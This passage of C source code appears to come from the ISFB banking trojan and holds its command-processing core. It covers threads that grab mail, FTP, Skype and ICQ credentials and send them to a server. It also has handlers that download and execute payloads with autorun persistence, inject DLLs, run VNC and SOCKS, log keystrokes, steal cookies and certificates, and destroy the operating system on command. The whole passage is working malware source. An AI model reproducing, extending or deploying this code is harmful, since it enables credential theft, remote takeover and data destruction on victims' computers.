	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;

	DbgPrint("ISFB_%04x: Common grabber thread started with ID 0x%x\n", g_CurrentProcessId, GetCurrentThreadId());
	
	if (ComInit(&hRes))
	{
		if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
		{
#ifdef _GRAB_MAIL
			if (GrabMask & GMASK_MAIL)
			{
				GrabOutlookExpress(pStream);
				GrabWindowsContacts(pStream);
				GrabWindowsAddressBook(pStream);
				GrabWindowsMail(pStream);
				GrabWindowsLiveMail(pStream);
			}	// if (GrabMask & GMASK_MAIL)
#endif	// _GRAB_MAIL

#ifdef _GRAB_FTP
			if (GrabMask & GMASK_FTP)
			{
				FtpGrabTotalCommander(pStream);
				FtpGrabFileZilla(pStream);
				FtpGrabWsFtp(pStream);
				FtpGrabFlashFxp3(pStream);
				FtpGrabFtpCommander(pStream);
				FtpGrabFarManager(pStream);
				FtpGrabWinScp(pStream);
				FtpGrabCoreFtp(pStream);
				FtpGrabSmartFtp(pStream);
			}
#endif	// _GRAB_FTP

#ifdef	_GRAB_IMS
			if (GrabMask & GMASK_IMS)
			{
				ImGrabSkype( pStream );
				ImGrabICQ7( pStream );
				ImGrabICQ8( pStream );
			}
#endif	// _GRAB_IMS

			if (bSize = StreamGetLength(pStream))
			{
				if (pBuffer = hAlloc(bSize))
				{
					StreamGotoBegin(pStream);
					CoInvoke(pStream, Read, pBuffer, bSize, &bSize);

					Status = FilesPackAndSendBuffer(NULL, pBuffer, bSize, SEND_ID_MAIL);
					hFree(pBuffer);
				}	// if (pBuffer = hAlloc(bSize))
			}	// if (bSize = StreamGetLength(pStream))
			else
				Status = ERROR_NOT_FOUND;

			CoInvoke(pStream, Release);

		}	// if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
		ComUninit(hRes);
	}	// if (ComInit(&hRes))

	DbgPrint("ISFB_%04x: Common grabber thread ended with status %u\n", g_CurrentProcessId, Status);

	return(Status);
}


//
//	Thread function.
//	Executes the specified function with the specified parameter as single thread.
//	Logs function result value.
//
WINERROR CommandHostThread(
	PCOMMAND_THREAD_CONTEXT	pContext
	)
{
	WINERROR Status = NO_ERROR;

	ENTER_WORKER();

	Status = ((LPTHREAD_START_ROUTINE)pContext->Function)(pContext->Parameter);

	if (pContext->Uid[0])
		CmdLogCommand(szLogCmdComplete, (LPTSTR)&pContext->Uid, Status);

	hFree(pContext);

	LEAVE_WORKER();

	return(Status);
}
	

//
//	Creates command host thread and executes the specified function within it.
//
WINERROR StartCommandThread(
	PVOID	Function,	// function to execute
	PVOID	Parameter,	// parameter to the function
	LPTSTR	pUid		// unique command ID
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hThread;
	ULONG	Len = 0, ThreadId;
	PCOMMAND_THREAD_CONTEXT	pContext;

	if (pUid)
		Len = lstrlen(pUid);

	if (pContext = hAlloc(sizeof(COMMAND_THREAD_CONTEXT) + (Len + 1) * sizeof(_TCHAR)))
	{
		pContext->Function = Function;
		pContext->Parameter = Parameter;
		if (Len)
			lstrcpy((LPTSTR)&pContext->Uid, pUid);
		else
			pContext->Uid[0] = 0;

		if (hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CommandHostThread, pContext, 0, &ThreadId))
			CloseHandle(hThread);
			// We do not free pContext here coz it has to be freed by CommandHostThread
		else
		{
			Status = GetLastError();
			hFree(pContext);
		}
	}	// if (pContext = hAlloc(...
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Initializes file searching thread to search for a file according to specified mask.
//
WINERROR FindFilesByMask(
	PCHAR	Mask,	// seach mask
	LPTSTR	pUid	// command UID
	)
{
	ULONG	MaskLen;
	PWCHAR	MaskW;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;

	MaskLen = strlen(Mask);
		
	if (MaskW = hAlloc((MaskLen + 1) * sizeof(WCHAR)))
	{
		ULONG i;
		// Converting mask to WCHAR, it is required to search paths longer then MAX_PATH chars
		for (i = 0; i<MaskLen; i++)
			MaskW[i] = (WCHAR)Mask[i];

		MaskW[i] = 0;

		if ((Status = StartCommandThread(&FilesThread, MaskW, pUid)) != NO_ERROR)
			hFree(MaskW);
		// we do not free MaskW here, coz it must be freed by the FilesThread
	}

	return(Status);
}


#ifndef _SEND_FORMS
//
//	Packs all stored grabbed HTTP forms and sends the result to the server.
//
WINERROR CmdPackGrabs(PVOID Context)
{
	WINERROR	Status;

	if ((Status = FilesPackAndSend(NULL, g_GrabStorageName, FILE_TYPE_FORM)) == NO_ERROR)
		FilesClearDirectory(g_GrabStorageName, TRUE, TRUE);

	UNREFERENCED_PARAMETER(Context);
	return(Status);
}


//
//	Generates time-based name for a storage file.
//
static LPTSTR GetStorageFilePath(
	LPTSTR	pDirPath,	// directory path to wich a newly created file name will be added
	ULONG	Type		// type of the file
	)
{
	LPTSTR	pFilePath;
	ULONG	Len;
	TEMP_NAME BinName;

	GetSystemTimeAsFileTime(&BinName.Time);

	// Byte swap to make a readable number
	Len = htonL(BinName.Time.dwHighDateTime);
	BinName.Time.dwHighDateTime = htonL(BinName.Time.dwLowDateTime);
	BinName.Time.dwLowDateTime = Len;
	BinName.Type = (UCHAR)Type;

	Len = lstrlen(pDirPath);

	if (pFilePath = hAlloc((Len + 1 + sizeof(TEMP_NAME) * 2 + 1) * sizeof(_TCHAR)))
	{
		lstrcpy(pFilePath, pDirPath);

		// Trying to create Grab Storage directory
		FilesCreateDirectory(pFilePath);

		pFilePath[Len] = _T('\\');
		StrBufferToHex(&BinName, sizeof(TEMP_NAME), &pFilePath[Len + 1]);
		pFilePath[Len + 1 + sizeof(TEMP_NAME) * 2] = 0;
	}	// if (pFilePath = hAlloc(...

	return(pFilePath);
}


//
//	Stores the specified data into newly created file within g_GrabStorageName folder.
//
static WINERROR CmdStoreGrab(
	PCHAR	pData,	// binary data to store
	ULONG	Size,	// size of the data in bytes
	ULONG	Type	// type of grabbed data (SEND_ID_XXX)
	)
{
	LPTSTR	pFilePath;
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;

	// Try to save the file in a loop because there can be a name collision,
	//	so we create a new name on each try
	do
	{
		if (pFilePath = GetStorageFilePath(g_GrabStorageName, Type))
		{
			Status = FilesSaveFile(pFilePath, pData, Size, 0);
			hFree(pFilePath);
		}
		else
			Status = ERROR_NOT_ENOUGH_MEMORY;

	} while(Status == ERROR_FILE_EXISTS);

	return(Status);
}

#endif	// !_SEND_FORMS


#ifdef	_ENABLE_KEYLOG

//
//	Gets the keylog data and sends it into the specfied pipe.
//	If no pipe specifed saves the keylog data into a file.
//
WINERROR CmdGetKeylog(
	HANDLE	hPipe
	)
{
	PWCHAR	pKeyLog;
	ULONG	Length = 0;
	WINERROR Status;

	if ((Status = KeyStoreReport(&pKeyLog, &Length, TRUE)) == NO_ERROR)
	{
		if (Length > 1)
		{
			if (hPipe)
			{
				// Sending keylog data back through the pipe
				if (PipeSendMessage(hPipe, CMD_REPLY, (PCHAR)pKeyLog, Length * sizeof(WCHAR)))
					PipeWaitMessage(hPipe, NULL, NULL, NULL);
			}
			else
				CmdStoreGrab((PCHAR)pKeyLog, Length * sizeof(WCHAR), SEND_ID_KEYLOG);
		}	// if (Length > 1)

		hFree(pKeyLog);
	}	// if ((Status = KeyStoreReport(&pKeyLog, &Length, TRUE)) == NO_ERROR)

	DbgPrint("ISFB_%04x: Saving keylog data done with status %u, bytes stored %u\n", g_CurrentProcessId, Status, Length);

	return(Status);
}

#endif	// _ENABLE_KEYLOG


#ifdef _LOAD_INI

//
//	Stores the specified data into newly created file within g_GrabStorageName folder.
//
static WINERROR CmdStoreIni(
	PCHAR	pData,	// binary data to store
	ULONG	Size	// size of the data in bytes
	)
{
	WINERROR Status = ERROR_INVALID_PARAMETER;

#ifdef _CHECK_DIGITAL_SIGNATURE
	if (VerifyDataSignature(pData, Size, FALSE))
#endif
	{
		// Saving packed data as it is
		if ((Status = RegWriteValue(szDataRegIniValue, pData, Size, REG_BINARY)) != NO_ERROR)
		{
			DbgPrint("ISFB_%04x: Failed writing INI-file to the registry.\n", g_CurrentProcessId);
		}
		else
		{
			DbgPrint("ISFB_%04x: INI-file saved within the the registry.\n", g_CurrentProcessId);
		}
	}	// if (VerifyDataSignature(pData, Size, FALSE))

	return(Status);
}

#endif	// LOAD_INI


//
//	Processes single command as server application.
//	This means all privilege-sensitive commands are bein executed here.
//
BOOL ServerProcessCommand(
	HANDLE	hPipe,		// handle to a pipe
	ULONG	MessageId,	// ID of the command message
	PCHAR	pData,		// command data
	ULONG	DataSize,	// size of the data buffer in bytes
	LPTSTR	pUid		// unique command ID string (for command log)
	)
{
	BOOL	Ret = TRUE;
	BOOL	bIsPlugin = FALSE, bStore = FALSE;
	WINERROR Status = ERROR_UNSUCCESSFULL;
	PCHAR	pBuffer;
	ULONG	Mask = 0, Size;

	switch(MessageId)
	{
	case CMD_CHECK:
		break;
	case CMD_FINDFILES:
		Status = FindFilesByMask(pData, pUid);
		break;
	case CMD_GETFILE:
		if (pData && DataSize)
		{
			SEC_INFO	SecInfo = {0};

			if ((Status = FilesCreateSection((LPWSTR)pData, &SecInfo)) == NO_ERROR)
			{
				// Working as Pipe server, sending file section to a client
				if (PipeSendMessage(hPipe, CMD_REPLY, (PCHAR)&SecInfo, sizeof(SEC_INFO)))
					PipeWaitMessage(hPipe, NULL, NULL, NULL);
				
				CloseHandle((HANDLE)SecInfo.hSection);
			}	// if ((Status = FilesCreateSection(
		}	// if (pData && DataSize)
		break;
	case CMD_EXE:
		{
#if _INJECT_AS_IMAGE
			// Replacing an existing ISFB installer with the new one
			LPTSTR	pInstallPath;

			if ((Status = RegReadValue(szDataRegExeValue, &pInstallPath, &Size)) == NO_ERROR)
			{
				XorDecryptBuffer(pInstallPath, Size, g_MachineRandSeed, FALSE);
				if (PathFileExists(pInstallPath))
					Status = FilesSaveFile(pInstallPath, pData, DataSize, FILE_FLAG_OVERWRITE);
				else
					Status = GetLastError();
				hFree(pInstallPath);
			}	// if ((Status = RegReadValue(szDataRegExeValue, &pInstallPath, &Size)) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, Status);
#else
			// Creating an EXE-file and executing it with the current process ID as parameter
			_TCHAR param_str[LdrUpdFmtLen];	// place to format a key string from szLdrUpdFmt
			wsprintf((LPTSTR)&param_str, szLdrNewUpdFmt, GetCurrentProcessId());

			if ((Status = CreateAndExecuteFile(pData, DataSize, (LPTSTR)&param_str, FALSE)) == NO_ERROR)
				CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
#endif
		}
		break;
	case CMD_DL_EXE:
		// Creating an EXE-file and executing it
		if ((Status = CreateAndExecuteFile(pData, DataSize, NULL, FALSE)) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
	case CMD_DL_EXE_ST:
		// Creating an EXE-file, registering it within Windows autorun and executing it
		if ((Status = CreateAndExecuteFile(pData, DataSize, NULL, TRUE)) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
	case CMD_RUN_VNC:
		if (InterlockedIncrement(&g_bVncActive) > 1)
		{
			InterlockedDecrement(&g_bVncActive);
			break;
		}
		Status = LoadDlls(pData, CMD_LOAD_PLUGIN, FALSE, NULL);
		break;
#ifdef _USE_PLUGINS
	case CMD_LOAD_PLUGIN:
		bIsPlugin = TRUE;
#endif
	case CMD_LOAD_DLL:
		if ((Status = CreateAndLoadDll(pData, DataSize, bIsPlugin)) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
	case CMD_REBOOT:
		if ((Status = Reboot()) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
	case CMD_DESTROY:
		if ((Status = DestroyOS()) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
#ifdef _ENABLE_CERTS
	case CMD_GET_CERTS:
		Status = StartCommandThread(&ExportSendCerts, NULL, pUid);
		break;
#endif
	case CMD_GET_COOKIES:
		Status = StartCommandThread(&GetCookies, NULL, pUid);
		break;
	case CMD_CLR_COOKIES:
		Status = StartCommandThread(&WipeCookies, NULL, pUid);
		break;
#ifdef	_ENABLE_SYSINFO
	case CMD_GET_SYSINFO:
		Status = StartCommandThread(&SysInfo, NULL, pUid);
		break;
#endif
#ifdef	_ENABLE_LOGGING
	case CMD_ADD_LOG:
		LogAdd(pData, DataSize);
		break;
	case CMD_GET_LOG:
		if (Size = LogGet(&pBuffer))
		{	
			if (hPipe)
			{
				// Working as Pipe server, sending log data to a client
				if (PipeSendMessage(hPipe, CMD_REPLY, pBuffer, Size))
					PipeWaitMessage(hPipe, NULL, NULL, NULL);
			}
			hFree(pBuffer);
		}	// if (Size = LogGet(&pBuffer))
		else
			Status = ERROR_NO_MORE_FILES;
		break;
#endif	// _ENABLE_LOGGING
#ifdef	_ENABLE_SOCKS
	case CMD_RUN_SOCKS:
		if (g_SocksServer)
			// The SOCKS server already started
			break;
	case CMD_SOCKS_START:
		ASSERT(pData[DataSize - 1] == 0);
		if (DataSize == sizeof(SOCKADDR_IN))
		{
			if ((Status = StartSocks((PSOCKADDR_IN)pData)) == NO_ERROR)
				CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		}
		else
			Status = ERROR_INVALID_PARAMETER;
		break;
	case CMD_SOCKS_STOP:
		if ((Status = StopSocks()) == NO_ERROR)
			CmdLogCommand(szLogCmdComplete, pUid, NO_ERROR);
		break;
#endif	// _ENABLE_SOCKS
#ifdef _ENABLE_KEYLOG
	case CMD_STORE_KEYLOG:
		bStore = TRUE;
	case CMD_GET_KEYLOG:
		Status = CmdGetKeylog(bStore ? NULL : hPipe);
		break;
	case CMD_KEYLOG_ON:
		// Disabling KeyLog and setting process list for it
		ASSERT(!pData || pData[DataSize - 1] == 0);

		if (!pData)
			// Deleting Keys value
			RegWriteValue(szDataRegKeysValue, NULL, 0, 0);

		KeyLogEnable(FALSE);
		CmdGetKeylog(NULL);
		Mask = PG_BIT_KEYLOG;
		bStore = TRUE;
	case CMD_KEYLOG_OFF:
		KeyLogEnable(bStore);
		Status = SetGroupId(g_ClientId.GroupId, NULL, (USHORT)((g_ClientId.Plugins & (~PG_BIT_KEYLOG)) | Mask), g_ClientId.HostIndex);

		if (pData)
		{
			XorEncryptBuffer(pData, DataSize, g_MachineRandSeed, FALSE);
			RegWriteValue(szDataRegKeysValue, pData, DataSize, REG_BINARY);
		}
		break;
#endif	// _ENABLE_KEYLOG
#ifdef	_GRAB_MAIL
	case CMD_GET_MAIL:
		Status = StartCommandThread(&CommonGrabberThread, (PVOID)GMASK_MAIL, pUid);
		break;
#endif
#ifdef	_GRAB_FTP
	case CMD_GET_FTP:
		Status = StartCommandThread(&CommonGrabberThread, (PVOID)GMASK_FTP, pUid);
		break;
#endif
#ifdef	_GRAB_IMS
	case CMD_GET_IMS:
		Status = StartCommandThread(&CommonGrabberThread, (PVOID)GMASK_IMS, pUid);
		break;
#endif
#ifdef _USER_MODE_INSTALL
	case CMD_SELF_DELETE:
		Status = StartCommandThread(&CmdSelfDelete, NULL, pUid);
		break;
#endif
	case CMD_LOG_COMMAND:
		if (pData && pUid && (DataSize == sizeof(WINERROR)))
			CmdLogCommand(szLogCmdComplete, pUid, *(WINERROR*)pData);
		break;
#ifdef _LOG_COMMANDS
	case CMD_GET_CMD_LOG:
		if ((Status = FilesLoadFile(g_CommandLogName, &pBuffer, &Size)) == NO_ERROR)
		{	
			// Working as Pipe server, sending log data to a client
			if (PipeSendMessage(hPipe, CMD_REPLY, pBuffer, Size))
				PipeWaitMessage(hPipe, NULL, NULL, NULL);
			hFree(pBuffer);
		}	// if (Size = LogGet(&pBuffer))
		break;
	case CMD_CLR_CMD_LOG:
		Status = FilesDeleteFile(g_CommandLogName);
		break;
#endif	// _LOG_COMMANDS
#ifndef _SEND_FORMS
	case CMD_STORE_FORM:
		if (pData && DataSize)
			Status = CmdStoreGrab(pData, DataSize, SEND_ID_FORM);
		break;
	case CMD_STORE_SCR:
		if (pData && DataSize)
			Status = CmdStoreGrab(pData, DataSize, SEND_ID_SCRSHOT);
		break;
	case CMD_STORE_AUTH:
		if (pData && DataSize)
			Status = CmdStoreGrab(pData, DataSize, SEND_ID_AUTH);
		break;
	case CMD_STORE_GRAB:
		if (pData && DataSize)
			Status = CmdStoreGrab(pData, DataSize, SEND_ID_GRAB);
		break;
	case CMD_PACK_FORMS:
		Status = StartCommandThread(&CmdPackGrabs, NULL, pUid);
		break;
#endif
#ifdef _LOAD_INI
	case CMD_STORE_INI:
		if (pData && DataSize)
			Status = CmdStoreIni(pData, DataSize);
		break;
#endif
#ifdef _ENABLE_VIDEO
	case CMD_MAKE_VIDEO:
		if (!g_bVideoThreadActive && pData && DataSize == sizeof(ULONG))
			Status = StartCommandThread(&MakeVideo, (PVOID)(ULONG_PTR)*(PULONG)pData, pUid);
		break;
#endif	// _ENABLE_VIDEO
	default:
		ASSERT(FALSE);
		break;
	}

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Status != NO_ERROR)
		CmdLogCommand(szLogCmdComplete, pUid, Status);

	return(Ret);
}


//
//	Processes single command string as client application.
//	This means all privilege-sensitive commands are bein send to a server through the pipe.
//
WINERROR ClientProcessCommand(
	ULONG	CmdHash,
	PCHAR	pParamStr,
	PCHAR	pUid
	)
{
	PCHAR	Data = NULL;
	ULONG	Mask = 0, bSize = 0;
	BOOL	bIsPlugin = FALSE;
	WINERROR Status = ERROR_INVALID_PARAMETER;

	switch (CmdHash)
	{
	case CRC_LOAD_UPDATE:
		// Download a file from the specified URL and execute it with the parameter.
		if (pParamStr)
		{
			if ((Status = RecvHttpData(pParamStr, &Data, &bSize, TRUE)) != NO_ERROR)
				break;
			ASSERT(Data);
			Status = PipeSendCommand(CMD_EXE, Data, bSize, pUid);
		}
		break;
	case CRC_LOAD_EXE:
		// Download a file from the specified URL and execute
		if (pParamStr)
		{
			if ((Status = RecvHttpData(pParamStr, &Data, &bSize, TRUE)) != NO_ERROR)
				break;
			ASSERT(Data);
			Status = PipeSendCommand(CMD_DL_EXE, Data, bSize, pUid);
		}
		break;
	case CRC_LOAD_REG_EXE:
		//Download a file from the specified URL, register it within Windows autorun and execute it
		if (pParamStr)
		{
			if ((Status = RecvHttpData(pParamStr, &Data, &bSize, TRUE)) != NO_ERROR)
				break;
			ASSERT(Data);
			Status = PipeSendCommand(CMD_DL_EXE_ST, Data, bSize, pUid);
		}
		break;
#ifdef _USE_PLUGINS
	case CRC_LOAD_PLUGIN:
		// Load and execute ISFB plugin DLL
		bIsPlugin = TRUE;	
#endif
	case CRC_LOAD_DLL:
		// Download a DLL from the specified URL and load it into the Explorer process
		if (pParamStr)
			Status = LoadDlls(pParamStr, (bIsPlugin ? CMD_LOAD_PLUGIN : CMD_LOAD_DLL), FALSE, pUid);
		break;
#ifdef _LOAD_REG_DLL
	case CRC_LOAD_REG_DLL:
		// Download a DLL from the specified URL, load it into the Explorer process and register it for autorun
		if (pParamStr)
			Status = LoadDlls(pParamStr, (bIsPlugin ? CMD_LOAD_PLUGIN : CMD_LOAD_DLL), TRUE, pUid);
		break;
	case CRC_UNREG_DLL:
		if (pParamStr)
			Status = CmdUnregDll(pParamStr);
		break;
#endif
	case CRC_GROUP:
		// Updating saved group ID within the registry.
		if (pParamStr)
		{
			if ((Status = SetGroupId(0, pParamStr, g_ClientId.Plugins, g_ClientId.HostIndex)) == NO_ERROR)
				PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		}
		break;
	case CRC_REBOOT:
		// Reboot the computer
		Status = PipeSendCommand(CMD_REBOOT, NULL, 0, pUid);
		break;
	case CRC_KILL:
		// Destroy the OS
		Status = PipeSendCommand(CMD_DESTROY, NULL, 0, pUid);
		break;
#ifdef _ENABLE_SYSINFO
	case CRC_GET_SYSINFO:
		// Gather and send system information
		Status = PipeSendCommand(CMD_GET_SYSINFO, NULL, 0, pUid);
		break;
#endif
#ifdef _ENABLE_CERTS
	case CRC_GET_CERTS:
		// Export certificates and send them to the server
		Status = PipeSendCommand(CMD_GET_CERTS, NULL, 0, pUid);	
		break;
#endif
	case CRC_GET_COOKIES:
		// Gather user cookies and SOLs and send them to the server
		Status = PipeSendCommand(CMD_GET_COOKIES, NULL, 0, pUid);	
		break;
	case CRC_CLR_COOKIES:
		// Clear user cookies, history and temporary internet files.
		Status = PipeSendCommand(CMD_CLR_COOKIES, NULL, 0, pUid);
		break;
	case CRC_SLEEP:
		if (pParamStr)
		{
			ULONG Value = StrToInt(pParamStr);
			DbgPrint("ISFB_%04x: Sleeping for %u milliseconds\n", g_CurrentProcessId, Value);
			Sleep(Value);
			Status = NO_ERROR;
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		}
		break;
	case CRC_SEND_ALL:
		if ((Status = SendAllPendingData()) == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
	case CRC_GET_FILES:
		if (pParamStr)
			Status = PipeSendCommand(CMD_FINDFILES, pParamStr, lstrlen(pParamStr) + sizeof(_TCHAR), pUid);
		break;
#ifdef _ENABLE_LOGGING
	case CRC_GET_LOG:
		if ((Status = GetAndSendData(CMD_GET_LOG, SEND_ID_LOG, LOG_SIZE_MAX, szLogFailed, szLog)) == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
#endif	// _ENABLE_LOGGING
#ifdef _ENABLE_SOCKS
	case CRC_SOCKS_START:
		// Start the SOCKS4/5 server
#ifdef _ENABLE_BACKCONNECT
		Status = SetGroupId(g_ClientId.GroupId, NULL, (g_ClientId.Plugins | PG_BIT_SOCKS), g_ClientId.HostIndex);
#else
		if (pParamStr)
		{
			SOCKADDR_IN	Addr;
			if (IniStringToTcpAddress(pParamStr, &Addr, TRUE))
				Status = PipeSendCommand(CMD_SOCKS_START, (PCHAR)&Addr, sizeof(SOCKADDR_IN), pUid);
		}
#endif
		break;
	case CRC_SOCKS_STOP:
		// Stop the SOCKS4/5 server
#ifdef _ENABLE_BACKCONNECT
		Status = SetGroupId(g_ClientId.GroupId, NULL, (g_ClientId.Plugins & (~PG_BIT_SOCKS)), g_ClientId.HostIndex);
#endif
		Status = PipeSendCommand(CMD_SOCKS_STOP, NULL, 0, pUid);
		break;
#endif	// _ENABLE_SOCKS
#ifdef _ENABLE_KEYLOG
	case CRC_GET_KEYLOG:
		// Send keylogger report
		if ((Status = GetAndSendData(CMD_GET_KEYLOG, SEND_ID_KEYLOG, LOG_SIZE_MAX, szLogFailed, szKeyLog)) == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
	case CRC_KEYLOG_ON:
		Status = PipeSendCommand(CMD_KEYLOG_ON, pParamStr, (pParamStr ? (lstrlen(pParamStr) + 1) : 0), pUid);
		break;
	case CRC_KEYLOG_OFF:
		Status = PipeSendCommand(CMD_KEYLOG_OFF, NULL, 0, pUid);
		break;
#endif	// _ENABLE_KEYLOG
#ifdef _GRAB_MAIL
	case CRC_GET_MAIL:
		// Grab and send mail accounts info
		Status = PipeSendCommand(CMD_GET_MAIL, NULL, 0, pUid);
		break;
#endif	// _GRAB_MAIL
#ifdef _GRAB_FTP
	case CRC_GET_FTP:
		// Grab and send FTP accounts info
		Status = PipeSendCommand(CMD_GET_FTP, NULL, 0, pUid);
		break;
#endif	// _GRAB_FTP
#ifdef _GRAB_IMS
	case CRC_GET_IMS:
		// Grab and send IMs accounts info
		Status = PipeSendCommand(CMD_GET_IMS, NULL, 0, pUid);
		break;
#endif	// _GRAB_IMS
	case CRC_SELF_DELETE:
		Status = PipeSendCommand(CMD_SELF_DELETE, NULL, 0, pUid);
		break;
#ifdef _TASK_FROM_EXPLORER
	case CRC_KNOCKER_START:
		if ((Status = SetGroupId(g_ClientId.GroupId, NULL, (g_ClientId.Plugins | PG_BIT_KNOCKER), g_ClientId.HostIndex)) == NO_ERROR)
		{
			HANDLE	hTaskTimer;

			if (hTaskTimer = CreateInitTimer(g_CommandTimerName, TRUE))
			{
				LARGE_INTEGER DueTime;
				DueTime.QuadPart = _RELATIVE(_SECONDS(g_KnockerTimeout));
				if (SetWaitableTimer(hTaskTimer, &DueTime, 0, NULL, NULL, FALSE))
					Status = NO_ERROR;
				else
					Status = GetLastError();
				CloseHandle(hTaskTimer);
			}
			else
				Status = GetLastError();
		}	// if ((Status = SetGroupId(...

		if (Status == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
	case CRC_KNOCKER_STOP:
		if ((Status = SetGroupId(g_ClientId.GroupId, NULL, (g_ClientId.Plugins & (~PG_BIT_KNOCKER)), g_ClientId.HostIndex)) == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
#endif	// _TASK_FROM_EXPLORER
#ifdef _URL_BLOCK_COMMAND
	case CRC_URL_BLOCK:
		if (pParamStr)
		{
			if ((Status = ConfigBlockUrl(pParamStr, lstrlen(pParamStr))) == NO_ERROR)
				PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		}
		break;
	case CRC_URL_UNBLOCK:
		if (pParamStr)
		{
			if ((Status = ConfigUnblockUrl(pParamStr, lstrlen(pParamStr))) == NO_ERROR)
				PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		}
		break;
#endif
	case CRC_FORMS_ON:
		Mask = PG_BIT_FORMS;
	case CRC_FORMS_OFF:
		if ((Status = SetGroupId(g_ClientId.GroupId, NULL, (USHORT)((g_ClientId.Plugins & (~PG_BIT_FORMS)) | Mask), g_ClientId.HostIndex)) == NO_ERROR)
			PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);
		break;
#ifdef _LOAD_INI
	case CRC_LOAD_INI:
		// Download an INI file from the specified URL and store it within the registry.
		if (pParamStr)
		{
			if ((Status = RecvHttpData(pParamStr, &Data, &bSize, FALSE)) != NO_ERROR)
				break;
			ASSERT(Data);
			Status = PipeSendCommand(CMD_STORE_INI, Data, bSize, pUid);
		}
		break;
#endif
	default:
		Status = ERROR_INVALID_FUNCTION;
		DbgPrint("ISFB_%04x: Unknown command.\n", g_CurrentProcessId);
		break;
	}	// switch (CmdHash)
				
	if (Data)
		hFree(Data);

	if (Status != NO_ERROR)
		PipeSendCommand(CMD_LOG_COMMAND, (PCHAR)&Status, sizeof(WINERROR), pUid);

	return(Status);
}

#ifdef _PRIVILEGED_COMMANDS
BOOL IsPrivilegedCommand(
	ULONG	NameHash
	)
{
	ULONG	i;
	BOOL	Ret = FALSE;
	for (i=0; i<(sizeof(g_PrivilegedCommands) / sizeof(ULONG)); i++)
	{
		if (g_PrivilegedCommands[i] == NameHash)
		{
			Ret = TRUE;
			break;
		}
	}
	return(Ret);
}
#endif	// _PRIVILEGED_COMMANDS


//
//	Requests active host for a command file.
//	Processes the received file.
//
VOID ReceiveCommmand(VOID)
{
	PCHAR	pBuffer, pLogBuffer = NULL;
	ULONG	Size, LogSize = 0, OrigSize = 0;
	WINERROR Status;
	PINI_PARAMETERS	pCommands;

#ifdef _LOG_COMMANDS
	// Requesting command log first
	if (pLogBuffer = hAlloc(LogSize = LOG_SIZE_MAX))
	{
		if ((PipeGetData(CMD_GET_CMD_LOG, pLogBuffer, &LogSize) != NO_ERROR) || LogSize == 0)
		{
			hFree(pLogBuffer);
			pLogBuffer = NULL;
			LogSize = 0;
		}
	}	// if (pLogBuffer = hAlloc(LogSize = LOG_SIZE_MAX))
#endif

#ifdef _POST_COMMANDS
	if (!pLogBuffer)
	{
		// Do not send empty buffer by a POST request coz PHP will not parse it correctly. Send CRLF instead.
		pLogBuffer = szCRLF;
		LogSize = cstrlen(szCRLF);
	}
	Status = ConfRequestData(g_TaskURL, 0, TRUE, pLogBuffer, LogSize, &pBuffer, &Size);
#else
	Status = ConfRequestData(g_TaskURL, 0, FALSE, pLogBuffer, LogSize, &pBuffer, &Size);
#endif
	//Status = FilesLoadFile("c:\\test\\command.bin", &pBuffer, &Size);

#ifdef _LOG_COMMANDS
	if (pLogBuffer && pLogBuffer != szCRLF)
	{
		if (Status == NO_ERROR || Status == ERROR_EMPTY)
			PipeSendCommand(CMD_CLR_CMD_LOG, NULL, 0, NULL);

		hFree(pLogBuffer);
	}	// if (pLogBuffer)
#endif

	if (Status == NO_ERROR)
	{
#ifdef _CHECK_DIGITAL_SIGNATURE
		OrigSize = VerifyDataSignature(pBuffer, Size, TRUE);
#ifdef _PRIVILEGED_COMMANDS
		if (OrigSize)
			// File is signed and verified
			Size = OrigSize;
#else
		if (Size = OrigSize)
#endif
		{
#else
		if (Size > 3)
		{
#endif
			DbgPrint("ISFB_%04x: Command file of %u bytes received.\n", g_CurrentProcessId, Size);

			ASSERT(pBuffer[Size] == 0);
			ASSERT((lstrlen(pBuffer)*sizeof(_TCHAR)) == Size);

			// Parsing command file
			// Command name is not case-sensitive.
			// Command parameter is case-sensitive coz there can be an URL and they are case-sensitive
			if ((Status = IniParseParamFile(pBuffer, '|', '=', &pCommands, FALSE, TRUE, g_CsCookie)) == NO_ERROR)
			{
				ULONG i;
#ifdef _PRIVILEGED_COMMANDS
				if (!OrigSize)
				{
					// File was not signed, so checking if it contains a privileged command
					for (i=0; i<pCommands->Count; i++)
					{
